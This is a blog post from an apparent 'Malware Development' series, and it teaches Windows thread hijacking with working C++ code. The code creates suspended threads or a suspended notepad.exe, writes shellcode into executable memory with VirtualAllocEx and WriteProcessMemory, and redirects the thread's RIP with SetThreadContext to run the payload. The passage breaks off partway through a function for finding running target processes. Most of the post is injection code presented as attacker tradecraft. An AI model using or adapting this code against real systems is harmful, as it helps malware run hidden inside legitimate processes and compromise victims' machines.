# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <h1 id="definition-of-thread-hijacking">Definition of Thread Hijacking<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#definition-of-thread-hijacking" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>A thread is the smallest unit of execution within a process. In modern operating systems like Windows, Linux, and macOS, processes are divided into one or more threads, each capable of executing code independently. Threads within the same process share the same memory space and system resources, allowing them to communicate with each other more efficiently than processes.</p>

<p>Thread hijacking is a technique used to take control of the execution flow of a thread within a process.</p>

<p>Steps of hijacking a thread:</p>

<ol>
  <li>
    <p><strong>Find Target Thread</strong>: We identify a thread within the target process that we want to hijack. This could be the main thread or any other thread running within the process.</p>
  </li>
  <li>
    <p><strong>Suspend Thread</strong>: We suspend the target thread to prevent it from executing further instructions.</p>
  </li>
  <li>
    <p><strong>Modify Thread Context</strong>: We modify the context of the suspended thread, usually by changing the instruction pointer (e.g., <code class="language-plaintext highlighter-rouge">RIP</code> on x86/x64 architectures) to point to our malicious code.</p>
  </li>
  <li>
    <p><strong>Resume Thread</strong>: Once the thread’s context has been modified, we resume the execution of the thread.</p>
  </li>
  <li>
    <p><strong>Execution of Malicious Code</strong>: The thread resumes execution, but instead of continuing its original task, it starts executing our code.</p>
  </li>
</ol>

<h1 id="local-hijack">Local Hijack<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#local-hijack" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Before we start working on remote processes we can first try to hijack a local function’s thread which is already within the address space of our executable.</p>

<p>As I mentioned, in order to hijack a thread you have to suspend it first and suspending a thread means temporarily pausing its execution, preventing it from running further instructions.</p>

<p>We can achieve that using  <code class="language-plaintext highlighter-rouge">CreateThread</code> API call:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">FUNC</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">FUNC</code> here is just a random function we’ve defined so that we can hijack its thread.</p>

<ul>
  <li><strong>CREATE_SUSPENDED</strong>  value we passed will create the thread in its suspended state.</li>
</ul>

<p>Now that we have our thread ready to be hijacked, we can start implementing the logic of our thread hijacking function:</p>

<p>First we need to introduce ourselves to an important data structure which is <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">Thread Context</a>.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_CONTEXT</span> <span class="p">{</span>
  <span class="n">DWORD64</span> <span class="n">P1Home</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">P2Home</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">P3Home</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">P4Home</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">P5Home</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">P6Home</span><span class="p">;</span>
  <span class="n">DWORD</span>   <span class="n">ContextFlags</span><span class="p">;</span>
  <span class="n">DWORD</span>   <span class="n">MxCsr</span><span class="p">;</span>
  <span class="n">WORD</span>    <span class="n">SegCs</span><span class="p">;</span>
  <span class="n">WORD</span>    <span class="n">SegDs</span><span class="p">;</span>
  <span class="n">WORD</span>    <span class="n">SegEs</span><span class="p">;</span>
  <span class="n">WORD</span>    <span class="n">SegFs</span><span class="p">;</span>
  <span class="n">WORD</span>    <span class="n">SegGs</span><span class="p">;</span>
  <span class="n">WORD</span>    <span class="n">SegSs</span><span class="p">;</span>
  <span class="n">DWORD</span>   <span class="n">EFlags</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Dr0</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Dr1</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Dr2</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Dr3</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Dr6</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Dr7</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rax</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rcx</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rdx</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rbx</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rsp</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rbp</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rsi</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rdi</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R8</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R9</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R10</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R11</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R12</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R13</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R14</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">R15</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">Rip</span><span class="p">;</span>
  <span class="k">union</span> <span class="p">{</span>
    <span class="n">XMM_SAVE_AREA32</span> <span class="n">FltSave</span><span class="p">;</span>
    <span class="n">NEON128</span>         <span class="n">Q</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="n">ULONGLONG</span>       <span class="n">D</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="k">struct</span> <span class="p">{</span>
      <span class="n">M128A</span> <span class="n">Header</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
      <span class="n">M128A</span> <span class="n">Legacy</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
      <span class="n">M128A</span> <span class="n">Xmm0</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm1</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm2</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm3</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm4</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm5</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm6</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm7</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm8</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm9</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm10</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm11</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm12</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm13</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm14</span><span class="p">;</span>
      <span class="n">M128A</span> <span class="n">Xmm15</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">DUMMYSTRUCTNAME</span><span class="p">;</span>
    <span class="n">DWORD</span>           <span class="n">S</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="p">}</span> <span class="n">DUMMYUNIONNAME</span><span class="p">;</span>
  <span class="n">M128A</span>   <span class="n">VectorRegister</span><span class="p">[</span><span class="mi">26</span><span class="p">];</span>
  <span class="n">DWORD64</span> <span class="n">VectorControl</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">DebugControl</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">LastBranchToRip</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">LastBranchFromRip</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">LastExceptionToRip</span><span class="p">;</span>
  <span class="n">DWORD64</span> <span class="n">LastExceptionFromRip</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CONTEXT</span><span class="p">,</span> <span class="o">*</span><span class="n">PCONTEXT</span><span class="p">;</span>
</code></pre></div></div>
<p>Each thread will have its own context structure, What we care about in this structure is the element <code class="language-plaintext highlighter-rouge">Rip</code> which stores the return pointer.</p>

<p>We need to modify this value to point to the start of our shellcode in memory, As once we resume our thread it will start executing the code in the <code class="language-plaintext highlighter-rouge">Rip</code> address.</p>

<p>We start by defining a context structure, then setting the <code class="language-plaintext highlighter-rouge">ContextFlags</code> to <code class="language-plaintext highlighter-rouge">CONTEXT_CONTROL</code> so that we can modify the context values easily.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">CONTEXT</span> <span class="n">context</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_CONTROL</span><span class="p">;</span>
</code></pre></div></div>

<p>Then we allocate an executable memory region to copy our shellcode:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    PVOID pMemory = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</code></pre></div></div>

<p>Copy our shellcode:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">memcpy</span><span class="p">(</span><span class="n">pMemory</span><span class="p">,</span> <span class="n">pAddress</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">);</span>
</code></pre></div></div>

<p>The next part we need to get the value of the context structure of our thread we want to hijack in order to update it, we can use <code class="language-plaintext highlighter-rouge">GetThreadContext</code> API call:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">GetThreadContext</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">]</span> <span class="n">LPCONTEXT</span> <span class="n">lpContext</span>
<span class="p">);</span>
</code></pre></div></div>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"GetThreadContext failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>After we got the context successfully, we update the <code class="language-plaintext highlighter-rouge">Rip</code> with the memory address of our shellcode:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">context</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">DWORD64</span><span class="o">&gt;</span><span class="p">(</span><span class="n">pMemory</span><span class="p">);</span>
</code></pre></div></div>

<p>Then we set the context again of the thread using <code class="language-plaintext highlighter-rouge">SetThreadContext</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"SetThreadContext failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>
</code></pre></div></div>

<p><strong>Complete code</strong>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">HijackThread</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">,</span><span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pAddress</span><span class="p">,</span><span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">CONTEXT</span> <span class="n">context</span> <span class="o">=</span> <span class="p">{};</span>

    <span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_CONTROL</span><span class="p">;</span>

    <span class="n">PVOID</span> <span class="n">pMemory</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="n">pMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>

        <span class="n">memcpy</span><span class="p">(</span><span class="n">pMemory</span><span class="p">,</span> <span class="n">pAddress</span><span class="p">,</span> <span class="n">dwSize</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"GetThreadContext failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>

    <span class="n">context</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">DWORD64</span><span class="o">&gt;</span><span class="p">(</span><span class="n">pMemory</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"SetThreadContext failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h1 id="remote-hijack---creating-a-new-process">Remote Hijack - Creating a new process<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#remote-hijack---creating-a-new-process" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>What we’ve explained above was local hijacking, but a more realistic attack would be remote thread hijacking.</p>

<p>If we want to do this remotely, we will be having extra steps as we need to manually enumerate processes and then find a thread inside that process, Let’s say that our target is <code class="language-plaintext highlighter-rouge">notepad.exe</code> process, we can do this is two ways:</p>

<ul>
  <li>Creating the process</li>
  <li>Enumerating the running processes</li>
</ul>

<h2 id="creating-a-new-process">Creating a new process<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#creating-a-new-process" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
<p>We can use <code class="language-plaintext highlighter-rouge">CreateProcess</code> API call to create notepad.exe:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre></div></div>

<p>The parameters we are mostly interested in are:</p>

<ul>
  <li><strong>lpApplicationName</strong>: This parameter specifies the name of the application to be executed</li>
  <li><strong>lpCommandLine</strong>: This parameter specifies the command line to be executed.</li>
  <li><strong>dwCreationFlags</strong>: This parameter determines how the process should be created.</li>
  <li><strong>lpStartupInfo</strong>: This parameter points to a <code class="language-plaintext highlighter-rouge">STARTUPINFO</code> structure that specifies how the main window for the new process should appear. It’s usually filled with zeros or initialized with appropriate values before calling <code class="language-plaintext highlighter-rouge">CreateProcess</code>.</li>
  <li><strong>lpProcessInformation</strong>: This parameter points to a <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> structure that receives information about the newly created process, such as its handle and identifier.</li>
</ul>

<p>We will be passing the full path of <code class="language-plaintext highlighter-rouge">notepad.exe</code> along with a <code class="language-plaintext highlighter-rouge">CREATE_SUSPENDED</code> creation flag, but before we open it we need to set some important stuff:</p>

<p>First we need to define <code class="language-plaintext highlighter-rouge">StartupInfo</code> and <code class="language-plaintext highlighter-rouge">ProcessInformation</code> structures and zero out their memory:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">));</span>

    <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS_INFORMATION</span><span class="p">));</span>
</code></pre></div></div>

<p>And then we call <code class="language-plaintext highlighter-rouge">GetEnvironmentVariableA</code> to get the value of <code class="language-plaintext highlighter-rouge">WINDIR</code> variable, this variablel will specifies the location of the Windows installation directory.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetEnvironmentVariableA</span><span class="p">(</span><span class="s">"WINDIR"</span><span class="p">,</span> <span class="n">WinDir</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">))</span> <span class="p">{</span>

      <span class="n">printf</span><span class="p">(</span><span class="s">"GetEnvironmentVariable failed with error %x"</span><span class="p">,</span><span class="n">GetLastError</span><span class="p">());</span>

  <span class="p">}</span>

  <span class="n">sprintf_s</span><span class="p">(</span><span class="n">lpPath</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">%s"</span><span class="p">,</span> <span class="n">WinDir</span><span class="p">,</span> <span class="n">lpProcessName</span><span class="p">);</span>
</code></pre></div></div>
<p>We use <code class="language-plaintext highlighter-rouge">sprintf</code> so we can append the name on our target process to the windows path and System32 folder, that full path will be something like <code class="language-plaintext highlighter-rouge">C:\\Windows\\System32\\Notepad.exe</code></p>

<p>And then after we’ve defined our structures and prepared the path we can now create the process:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  if (!CreateProcessA(
      NULL,
      lpPath,
      NULL,
      NULL,
      FALSE,
      CREATE_SUSPENDED,
      NULL,
      NULL,
      &amp;si,
      &amp;pi
  )
      ) {
      printf("CreateProcess failed with erorr %x", GetLastError());
  }

  *dwProcessID = pi.dwProcessId;
  *hProcess = pi.hProcess;
  *hThread = pi.hThread;
</code></pre></div></div>
<p>And finally we save the values of the process ID, Handle, and first thread’s ID.</p>

<h2 id="injecting-the-shellcode">Injecting the shellcode<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#injecting-the-shellcode" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>After we’ve got a handle to our process, we need to inject the payload in order to later execute it:</p>

<p>We simple use <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> then <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>. This function will give us a pointer to the shellcode memory inside the <code class="language-plaintext highlighter-rouge">ppAddress</code> OUT parameter we passed.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">InjectShellcode</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">ppAddress</span><span class="p">)</span> <span class="p">{</span>


    <span class="n">SIZE_T</span> <span class="n">dwNumberofBbytesWritten</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ppAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ppAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">*</span><span class="n">ppAddress</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNumberofBbytesWritten</span><span class="p">)</span> <span class="o">||</span> <span class="n">dwNumberofBbytesWritten</span> <span class="o">!=</span> <span class="n">SizeofShellcode</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"WriteProcessMemory failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div>

<h2 id="hijacking-the-thread">Hijacking the thread<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#hijacking-the-thread" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Last but not least we implement the function that’ll hijack that thread we retrieved before:</p>

<p>It will be the same logic as the one explained above.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">ThreadHijacking</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">pAddess</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">CONTEXT</span> <span class="n">context</span><span class="p">;</span>

    <span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="p">{</span> <span class="n">CONTEXT_CONTROL</span> <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"GetThreadContext failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">context</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)(</span><span class="o">*</span><span class="n">pAddess</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"SetThreadContext failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    
    <span class="p">}</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">);</span>

    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="execution">Execution<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#execution" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Testing the code we can see that our MessageBox is being triggered (you can generate a simple messagebox payload using msvenom).</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/8-0.png" alt="P1"></p>

<h1 id="remote-hijack---enumerating-existing-processes" class="active">Remote Hijack - enumerating existing processes<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/#remote-hijack---enumerating-existing-processes" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>We can slightly modify this to be even better, instead of creating a new process we can directly enumerate existing ones and search for our target, I will not be explaining the process enumeration in depth as It was explained before <a href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-04/">here</a></p>

<p>We will be using the same techniques <code class="language-plaintext highlighter-rouge">CreateToolhelp32Snapshot()</code> and <code class="language-plaintext highlighter-rouge">Process32First</code>,<code class="language-plaintext highlighter-rouge">Process32Next</code></p>

<p>The only new thing will be the thread enumeration, but the technique is very similar to the process enumeration, As we will be using <code class="language-plaintext highlighter-rouge">CreateToolhelp32Snapshot</code> to snapshot threads inside the process also <code class="language-plaintext highlighter-rouge">Thread32First</code> and <code class="language-plaintext highlighter-rouge">Thread32Next</code> to navigate through the snapshot elements:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">FindNotepadProcess</span><span class="p">(</span><span class="n">OUT</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">dwProcessID</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
